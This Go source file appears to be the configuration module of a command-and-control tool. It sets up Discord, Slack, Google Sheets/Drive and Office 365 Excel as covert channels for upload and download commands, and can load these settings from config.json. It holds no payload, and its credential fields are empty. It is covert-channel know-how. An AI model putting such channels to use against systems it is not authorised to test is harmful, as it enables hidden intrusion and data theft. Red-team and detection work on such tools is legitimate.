package common

import (
	"encoding/json"
	"os"
)

// Universal Config
var (
	debug    bool = true //debug is on by default
	multiApp bool = true // all enable apps will be used by default
)

// Discord Info
var (
	discordBotEnable   bool   = false      // change to true to enable
	discordBotToken    string = ""         //add your token here (See Wiki for more info)
	discordBotUpload   string = "upload"   // change if you want to use something else for upload
	discordBotDownload string = "download" // change if you want to use something else for download
)

// Slack Info
var (
	slackBotEnable       bool   = false      // change to true to enable
	slackRTM             bool   = true       // by default the RTM API is used
	slackBotRTMAuthToken string = ""         // add your RTM token here (See Wiki for more info)
	slackBotAuthToken    string = ""         // add your Auth token here, not needed with RTM mode (See Wiki for more info)
	slackBotAppToken     string = ""         // add your App token here, not needed with RTM mode (See Wiki for more info)
	slackBotUpload       string = "upload"   // change if you want to use something else for upload
	slackBotDownload     string = "download" // change if you want to use something else for download
)

// Google Sheets Info
var (
	googleC2Enable      bool   = false // change to true to enable
	googleC2Credential  string = ""    // add your credential file here (See Wiki for more info)
	googleC2SheetId     string = ""    // add your sheet ID here (See Wiki for more info)
	googleC2DriveId     string = ""    // add your drive ID here (See Wiki for more info)
	googleC2ShowToken   bool   = false // change to true show token in sheet
	googleC2EnableHTTP3 bool   = false // change to true to enable HTTP3/QUIC (currently not implemented yet)
)

// Excel variables
var (
	o365ExcelEnable       bool   = false // change to true to enable
	o365ExcelTenantId     string = ""    // add your tenant ID here (See Wiki for more info)
	o365ExcelClientId     string = ""    // add your client ID here (See Wiki for more info)
	o365ExcelClientSecret string = ""    // add your client secret here (See Wiki for more info)
	o365ExcelFileName     string = ""    // add your file name here (See Wiki for more info)
	o365ExcelUserId       string = ""    // add your user ID here (See Wiki for more info)
)
var (
	AllC2Configs Config
)

func initDiscord() {
	AllC2Configs.Discord.Enable = discordBotEnable
	AllC2Configs.Discord.Token = discordBotToken
	AllC2Configs.Discord.Upload = discordBotUpload
	AllC2Configs.Discord.Download = discordBotDownload
}

func initSlack() {
	AllC2Configs.Slack.Enable = slackBotEnable
	AllC2Configs.Slack.LegacyRTMMode = slackRTM
	AllC2Configs.Slack.AuthToken = slackBotAuthToken
	AllC2Configs.Slack.AppToken = slackBotAppToken
	AllC2Configs.Slack.RTMAuthToken = slackBotRTMAuthToken
	AllC2Configs.Slack.Upload = slackBotUpload
	AllC2Configs.Slack.Download = slackBotDownload

}

func initGoogleSheets() {
	AllC2Configs.Google.Enable = googleC2Enable
	AllC2Configs.Google.Credential = googleC2Credential
	AllC2Configs.Google.SheetId = googleC2SheetId
	AllC2Configs.Google.DriveId = googleC2DriveId
	AllC2Configs.Google.ShowToken = googleC2ShowToken
	AllC2Configs.Google.EnableHTTP3 = googleC2EnableHTTP3
}

func initO365() {
	AllC2Configs.O365.Enable = o365ExcelEnable
	AllC2Configs.O365.TenantId = o365ExcelTenantId         //App registration (Directory)
	AllC2Configs.O365.ClientId = o365ExcelClientId         //App registration (Application)
	AllC2Configs.O365.ClientSecret = o365ExcelClientSecret //App registration (Secret)
	AllC2Configs.O365.FileName = o365ExcelFileName         //OneDrive file name
	AllC2Configs.O365.UserId = o365ExcelUserId             //from Admin Center
}

func initUniversal() {
	AllC2Configs.Debug.Enable = debug
	AllC2Configs.MultiApp.Enable = multiApp
}

func init() {
	// name of the file
	filename := "config.json"

	// check if file exists
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		// if not exists use hardcoded values
		initDiscord()
		initGoogleSheets()
		initO365()
		initSlack()
		initUniversal()
	} else {
		// if exists, read the file for the following json file structure:
		// {
		//     "discord": {
		//         "enable": true,
		//         "token": "your_discord_token"
		//     },
		//     "google": {
		//         "enable": true,
		//         "credential": "path_to_your_google_credentials_file",
		//         "sheet_id": "your_google_sheet_id",
		//         "drive_id": "your_google_drive_id"
		//     },
		//     "o365": {
		//         "enable": true,
		//         "tenant_id": "your_o365_tenant_id",
		//         "client_id": "your_o365_client_id",
		//         "client_secret": "your_o365_client_secret",
		//         "file_name": "your_o365_file_name",
		//         "user_id": "your_o365_user_id"
		//     },
		//     "debug": {
		//         "enable": true
		//     },
		//     "multi_thread": {
		//         "enable": true
		//     }
		// }
		data, err := os.ReadFile(filename)
		if err != nil {
			AllC2Configs.Debug.LogDebug("Error reading the file")
			return
		}

		// unmarshal the data
		err = json.Unmarshal(data, &AllC2Configs)
		if err != nil {
			AllC2Configs.Debug.LogDebug("Error unmarshaling the data")
			return
		}
	}
}
